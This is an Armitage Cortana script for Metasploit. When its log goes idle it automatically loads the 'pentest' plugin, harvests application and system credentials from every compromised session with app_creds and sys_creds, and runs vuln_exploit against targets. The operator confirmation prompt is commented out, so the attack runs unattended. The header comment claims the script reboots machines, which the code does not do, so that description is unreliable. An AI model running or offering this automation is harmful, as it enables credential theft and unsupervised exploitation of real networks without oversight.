# When Cortana is idle reboot all computers with sessions.
# by monstream00

# ~/.armitage/120923/all
# ls /opt/metasploit/msf3/data/armitage/ -aiRltu | grep cortana.log | cut -d " " -f7,8
# 2012-09-23 19:30
# If log not tuched in 30 min reboot all computers with sessions
# root@bt:~/.armitage/120923/all# stat -c "%Y" /opt/metasploit/msf3/data/armitage/cortana.log
# 1348456160
#  %Y     Time of last modification as seconds since Epoch
# 60sec * 30min = 1800 = 1348456160+1800 = 1348457960
# [*] exec: stat -c "%Y" /opt/metasploit/msf3/data/armitage/cortana.log
#
# stat		 1348456160
# Current Epoch: 1348509198251 fix with substr
# Current Epoch: 1348509858

# 60sec * 30min = 1800 = 1348456160+1800 = 1348457960
#$globalMin = 1800;
$globalMin = 1300;

on heartbeat_1m {
	$console = console();
	cmd($console, "stat -c \"\%Y\" /opt/metasploit/msf3/data/armitage/cortana.log");
}

on console_stat {
	#println("$3");
	$dateEpochMsec = ticks();
	$dateEpoch = substr($dateEpochMsec, 0, 10);
	#println("Current Epoch: " . $dateEpoch );
	$checkDate = ($dateEpoch - $globalMin);
	#println("Olddate Epoch: " . $checkDate );
	$checkMin = substr($checkDate, 0, 8);
	#println("$checkMin");
	if ($3 hasmatch $checkMin) {
		#println("We have cortana inactivity time, should we autohack?");
		#$answer = prompt_text("Do you want cortana to auto hack based on nessus data?");
		$answer = 1;#uncomment if cortana stand alone
		if ($answer !is $null) {
			#show_message("Ok here we go!");
			println("[*]Idle Loading Pentest Plugin");		
			$console = console();
			$console = open_console_tab("Pivot_Network_Discover_$1"); #Debug use
			cmd($console, "load pentest");
			println("[*] App_Creds");
			cmd($console, "echo [*] `date` App_Creds >> /opt/metasploit/msf3/data/armitage/cortana.log");
			cmd($console, "app_creds <all>");	
			println("[*] Sys_Creds");
			cmd($console, "echo [*] `date` Sys_Creds >> /opt/metasploit/msf3/data/armitage/cortana.log");
			cmd($console, "sys_creds <all>");	
			#println("[*] Discover_DB");
			#cmd($console, "echo [*] `date` Discover_DB >> /opt/metasploit/msf3/data/armitage/cortana.log");	
			#cmd($console, "discover_db");
			println("[*] Vuln_Exploit");
			cmd($console, "echo [*] `date` Vuln_Exploit >> /opt/metasploit/msf3/data/armitage/cortana.log");
			cmd($console, "vuln_exploit");
		} else {
			println("[*]Maybe another time then");
		}
	}
}

